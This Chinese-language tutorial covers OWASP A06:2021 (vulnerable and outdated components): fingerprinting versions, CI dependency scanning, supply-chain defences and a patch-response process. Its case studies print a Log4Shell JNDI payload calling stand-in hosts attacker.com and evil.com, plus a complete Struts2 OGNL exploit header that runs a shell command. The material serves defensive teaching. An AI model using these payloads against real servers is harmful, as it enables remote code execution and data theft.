A06:2021 - 易受攻击和过时的组件

HIGH 排名第6

Vulnerable and Outdated Components（易受攻击和过时的组件）是现代软件面临的主要威胁之一。现代应用平均有 80% 的代码来自第三方依赖，一个组件的漏洞可能影响数百万应用。

为什么这个问题如此严重

攻击者不需要发现新漏洞——他们只需要找到使用已知漏洞组件的目标。CVE公开后，利用代码通常在数小时内出现，而大多数组织需要数周甚至数月才能完成补丁更新。

1. 概述

1.1 现代软件的依赖问题

依赖树示例 (Node.js 项目)： your-app (package.json: 15 个直接依赖) ├── express@4.18.2 │ ├── body-parser@1.20.1 │ │ ├── bytes@3.1.2 │ │ ├── raw-body@2.5.1 │ │ └── ... (8 更多) │ ├── cookie@0.5.0 │ └── ... (30 更多) ├── mongoose@7.0.3 │ ├── mongodb@5.1.0 │ │ ├── bson@5.0.1 │ │ └── ... (12 更多) │ └── ... (15 更多) └── ... (13 更多直接依赖) 最终: 15 个直接依赖 → 800+ 个间接依赖（传递依赖）！ 问题： ✗ 你可能不知道间接依赖的存在 ✗ 间接依赖中的漏洞同样影响你的应用 ✗ 升级一个包可能破坏整个依赖链 ✗ 已停止维护的包永远不会修复漏洞

1.2 你可能存在风险的情况

风险信号说明
不知道依赖版本无法列出所有直接和间接依赖的确切版本
组件过时使用的组件已不再维护或有更新版本
不扫描漏洞没有定期进行依赖漏洞扫描
不及时更新已知漏洞公布后无法快速升级
不测试兼容性无法安全地升级组件（缺少测试覆盖）
无SBOM没有软件物料清单追踪组件

2. 识别漏洞组件

2.1 版本探测方法

# 前端组件版本探测

# 1. 查看页面源码中的版本注释
<!-- jQuery v3.6.0 -->

# 2. 浏览器控制台
jQuery.fn.jquery       // "3.6.0"
angular.version        // Angular版本
React.version          // React版本
_.VERSION              // Lodash版本

# 3. Wappalyzer 浏览器插件（自动识别技术栈）

# 后端组件版本探测

# HTTP 响应头

X-Powered-By: Express       ← 暴露框架
X-AspNet-Version: 4.0.30319 ← 暴露.NET版本

# 特征文件
/web-inf/web.xml          (Java)
/package.json             (Node.js - 如果暴露)
/composer.json            (PHP)
/Gemfile.lock             (Ruby)

# Nmap 版本探测
nmap -sV -p 80,443,8080,8443 target.com

# 指纹识别工具
whatweb http://target.com
wappalyzer-cli http://target.com

4.3 CI/CD 集成示例

# GitHub Actions - Dependabot 配置
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"

# GitHub Actions - Trivy 扫描
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  trivy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'HIGH,CRITICAL'
          exit-code: '1'  # 发现高危漏洞时失败

# GitLab CI - Snyk 集成
dependency_scanning:
  stage: test
  image: snyk/snyk:node
  script:
    - snyk test --severity-threshold=high
    - snyk monitor
  allow_failure: false  # 有高危漏洞则阻止合并

5.3 防御供应链攻击

# 1. 使用锁文件（Lock Files）固定版本
# package-lock.json, yarn.lock, Pipfile.lock, go.sum
npm ci  # 使用 ci 而非 install，严格按lock文件安装

# 2. 验证包完整性
# npm - 使用 integrity hash (package-lock.json 已包含)
# Python - 使用 hash-checking mode
pip install --require-hashes -r requirements.txt

# requirements.txt (带hash)
django==4.2.0 \
  --hash=sha256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

# 3. 使用私有仓库/镜像
# 配置私有 npm registry
npm config set registry https://registry.internal.company.com/

# 4. 依赖混淆防御 - 在私有仓库中注册占位包
# 确保内部包名不会从公共仓库下载

# 5. 使用 Sigstore/cosign 验证签名
cosign verify-blob --signature sig.json --certificate cert.pem artifact.tar.gz

# 6. 审查新依赖的安全标准

# - 下载量和社区规模
# - 是否有已知漏洞
# - 维护者信誉
# - 依赖树复杂度

6. 真实漏洞案例分析

6.1 Log4Shell (CVE-2021-44228)

Log4Shell - 2021年最严重的安全事件

Apache Log4j 2.x 中的远程代码执行漏洞。CVSS 10.0（满分）。影响全球数百万 Java 应用。

# Log4Shell 漏洞原理
# Log4j 支持在日志消息中进行 JNDI 查找
# 攻击者控制的字符串被记录到日志时触发

# 攻击 Payload（作为HTTP请求头、用户名等任何会被记录的输入）
${jndi:ldap://attacker.com/exploit}

# 攻击流程：
# 1. 攻击者发送包含payload的请求
#    GET / HTTP/1.1
#    User-Agent: ${jndi:ldap://evil.com/a}
#
# 2. 应用使用 Log4j 记录请求
#    logger.info("Request from: " + request.getHeader("User-Agent"));
#
# 3. Log4j 解析 ${jndi:ldap://evil.com/a}
#    → 连接攻击者的 LDAP 服务器
#    → 下载并执行恶意 Java 类
#    → 远程代码执行 (RCE)！

# 检测是否受影响
# 方法1：检查 Log4j 版本
find / -name "log4j-core-*.jar" 2>/dev/null
# 2.0-beta9 到 2.14.1 都受影响

# 方法2：使用检测工具
# log4j-scan
python3 log4j-scan.py -u "http://target.com"

# 修复方案：
# 1. 升级到 Log4j 2.17.1+（最佳方案）
# 2. 临时缓解：设置系统属性
#    -Dlog4j2.formatMsgNoLookups=true
# 3. 删除 JndiLookup 类
#    zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

6.2 Apache Struts2 (CVE-2017-5638)

# Equifax 数据泄露的根因 - 1.43亿人数据泄露

# 漏洞：Jakarta Multipart 解析器中的 OGNL 表达式注入
# 攻击方式：通过特制的 Content-Type 头触发 RCE

# Exploit Header
Content-Type: %{(#_='multipart/form-data').
  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
  (#_memberAccess?(#_memberAccess=#dm):
  ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
  (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
  (#ognlUtil.getExcludedPackageNames().clear()).
  (#ognlUtil.getExcludedClasses().clear()).
  (#context.setMemberAccess(#dm)))).
  (#cmd='whoami').
  (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
  (#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).
  (#p=new java.lang.ProcessBuilder(#cmds)).
  (#p.redirectErrorStream(true)).(#process=#p.start()).
  (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
  (#ros.flush())}

# 教训：
# - 漏洞公布于 2017年3月
# - Equifax 于 2017年5月遭到攻击
# - 补丁已可用2个月但未被应用！
# - 结果：1.43亿消费者数据泄露，罚款7亿美元

6.3 xz-utils 后门 (CVE-2024-3094)

xz-utils 供应链攻击时间线： 2021: "Jia Tan" 开始向 xz-utils 提交代码 ↓ (建立信任，提交有用的代码) 2022: 多个压力账号要求原维护者交出维护权 ↓ (社工攻击) 2023: "Jia Tan" 获得 co-maintainer 权限 ↓ (开始植入后门准备) 2024.2: 发布 xz-utils 5.6.0/5.6.1 含后门 ↓ 2024.3.28: 微软工程师 Andres Freund 发现 SSH 延迟异常 ↓ (通过性能分析发现后门) 2024.3.29: 漏洞公开披露，全球紧急响应 后门效果： - 攻击者可通过特制 SSH 证书在目标系统执行任意命令 - 绕过 SSH 认证 - 差点进入 Debian/Ubuntu/Fedora 稳定版 教训： ✗ 开源维护者信任链的脆弱性 ✗ 单一维护者项目的供应链风险 ✗ 代码审查无法覆盖所有攻击面（混淆在测试文件中）

7. 防御方案

7.1 组件管理策略

组件安全管理最佳实践
  1. 维护完整的资产清单 (SBOM)：知道你用了什么
  2. 持续监控漏洞：订阅安全公告，使用自动化工具
  3. 及时升级：建立快速响应机制（特别是Critical级别）
  4. 移除不用的依赖：减小攻击面
  5. 使用官方来源：只从官方仓库获取组件
  6. 锁定版本：使用lock文件固定精确版本
  7. 验证完整性：校验hash/签名
  8. 测试覆盖：确保升级后有自动化测试保障

7.2 漏洞响应流程

组件漏洞应急响应流程： ┌─────────────┐ │ 漏洞情报获取 │ ← CVE公告 / SCA工具告警 / 安全社区 └──────┬──────┘ ▼ ┌─────────────┐ │ 影响评估 │ ← 是否使用该组件？哪个版本？ └──────┬──────┘ 是否在受影响范围？ ▼ ┌─────────────┐ │ 优先级判定 │ ← CVSS评分 + 业务影响 + 可利用性 └──────┬──────┘ ▼ ┌─────────────┐ ┌─────────────┐ │ 修复方案 │───→│ 临时缓解 │ (如果补丁不可用) │ 升级版本 │ │ WAF规则 │ └──────┬──────┘ │ 配置调整 │ ▼ └─────────────┘ ┌─────────────┐ │ 测试验证 │ ← 自动化测试 + 漏洞验证 └──────┬──────┘ ▼ ┌─────────────┐ │ 部署上线 │ ← 快速发布流程 └──────┬──────┘ ▼ ┌─────────────┐ │ 复盘总结 │ ← 更新流程、加强监控 └─────────────┘ 响应时间目标(SLA)： Critical (CVSS 9.0+): 24小时内修复 High (CVSS 7.0-8.9): 72小时内修复 Medium (CVSS 4.0-6.9): 30天内修复 Low (CVSS 0.1-3.9): 下个迭代修复
